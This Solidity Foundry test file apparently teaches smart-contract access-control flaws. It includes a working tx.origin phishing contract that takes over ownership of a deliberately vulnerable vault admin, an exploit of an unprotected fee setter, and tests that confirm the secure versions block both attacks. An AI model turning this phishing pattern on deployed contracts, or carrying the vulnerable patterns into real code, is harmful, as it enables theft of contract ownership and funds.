// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {
    VulnerableVaultAdmin,
    SecureVaultAdmin
} from "../src/vulnerabilities/AccessControlManager.sol";

/// @notice Phishing contract demonstrating why tx.origin is dangerous
contract PhishingAttacker {
    VulnerableVaultAdmin public target;
    address public attacker;

    constructor(address _target, address _attacker) {
        target = VulnerableVaultAdmin(_target);
        attacker = _attacker;
    }

    // When the legitimate owner interacts with this contract (e.g. claim airdrop),
    // this fallback hijacks the target contract ownership because tx.origin is the owner!
    receive() external payable {
        target.setOwnerPhishable(attacker);
    }
}

contract AccessControlTest is Test {
    VulnerableVaultAdmin public vulnAdmin;
    SecureVaultAdmin public secureAdmin;

    address public owner = address(0xAA);
    address public attacker = address(0xBAD);
    address public newAdmin = address(0xBB);

    function setUp() public {
        vm.prank(owner);
        vulnAdmin = new VulnerableVaultAdmin();

        vm.prank(owner);
        secureAdmin = new SecureVaultAdmin();
    }

    /// @notice Proves the vulnerability: Unprotected function allows arbitrary caller to change critical parameters
    function test_Exploit_UnprotectedFunction() public {
        assertEq(vulnAdmin.protocolFee(), 100);

        // Attacker changes fee without any authorization
        vm.prank(attacker);
        vulnAdmin.setProtocolFeeUnprotected(9999);

        assertEq(vulnAdmin.protocolFee(), 9999);
        console.log("[CRITICAL CONFIRMED] Protocol fee manipulated by unauthorized attacker!");
    }

    /// @notice Proves tx.origin phishing exploit
    function test_Exploit_TxOriginPhishing() public {
        assertEq(vulnAdmin.owner(), owner);

        PhishingAttacker phisher = new PhishingAttacker(address(vulnAdmin), attacker);

        // Owner sends ETH or interacts with malicious phishing contract using standard call
        vm.deal(owner, 1 ether);
        vm.prank(owner, owner); // msg.sender = owner, tx.origin = owner
        (bool ok, ) = address(phisher).call{value: 0.1 ether}("");
        require(ok, "Phishing trigger failed");

        // Ownership of vulnAdmin was stolen!
        assertEq(vulnAdmin.owner(), attacker);
        console.log("[CRITICAL CONFIRMED] Ownership stolen via tx.origin phishing attack!");
    }

    /// @notice Proves the mitigation: Unauthorized caller rejected with custom error
    function test_Mitigation_OnlyOwnerBlocksUnauthorized() public {
        vm.prank(attacker);
        vm.expectRevert(
            abi.encodeWithSelector(
                SecureVaultAdmin.UnauthorizedCaller.selector,
                attacker
            )
        );
        secureAdmin.setProtocolFee(500);

        // Fee remains unchanged
        assertEq(secureAdmin.protocolFee(), 100);
        console.log("[SECURITY VERIFIED] Unauthorized caller reverted with custom error!");
    }

    /// @notice Proves the mitigation: 2-step ownership transfer prevents accidental zero or wrong address lock
    function test_Mitigation_TwoStepOwnershipTransfer() public {
        // Step 1: Owner initiates transfer
        vm.prank(owner);
        secureAdmin.transferOwnership(newAdmin);

        // Owner is STILL the active owner until newAdmin accepts
        assertEq(secureAdmin.owner(), owner);
        assertEq(secureAdmin.pendingOwner(), newAdmin);

        // Step 2: Random user cannot accept
        vm.prank(attacker);
        vm.expectRevert(SecureVaultAdmin.NotPendingOwner.selector);
        secureAdmin.acceptOwnership();

        // Step 3: Nominated pending owner accepts
        vm.prank(newAdmin);
        secureAdmin.acceptOwnership();

        assertEq(secureAdmin.owner(), newAdmin);
        assertEq(secureAdmin.pendingOwner(), address(0));
        console.log("[SECURITY VERIFIED] 2-Step ownership completed securely without lock risk!");
    }
}
